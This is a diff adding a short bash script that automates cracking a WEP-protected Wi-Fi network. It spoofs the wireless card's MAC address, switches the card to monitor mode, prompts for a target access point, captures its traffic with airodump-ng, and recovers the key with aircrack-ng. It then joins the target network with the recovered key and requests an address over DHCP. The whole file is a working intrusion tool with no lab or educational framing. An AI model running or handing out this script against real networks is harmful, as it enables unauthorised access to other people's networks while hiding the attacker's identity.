@@ -1,0 +1,32 @@
+#!/bin/bash
+#start monitor mode for alfa card
+ifconfig wlan1 down
+
+#change mac address
+macchanger --mac 00:11:22:33:44:55 wlan1
+
+#start monitor mode
+airmon-ng start wlan1
+
+#find a target
+airodump-ng mon0  
+echo 'bssid: '
+read -r bssid
+echo 'channel: '
+read -r channel
+echo 'output: '
+read -r output
+echo 'essid: '
+read -r essid
+
+#capture data from AP, when satisfied, Ctrl-C to exit and crack the wep key
+airodump-ng mon0 --bssid $bssid -c $channel -w $output && aircrack-ng $(ls ./ | grep cap)
+
+#connect to network
+echo 'enter decrypted key (no delimiters): '
+read key
+airmon-ng stop wlan1
+iwconfig wlan1 essid $essid key $key
+dhclient wlan1
+ifconfig wlan1
+iwconfig wlan1
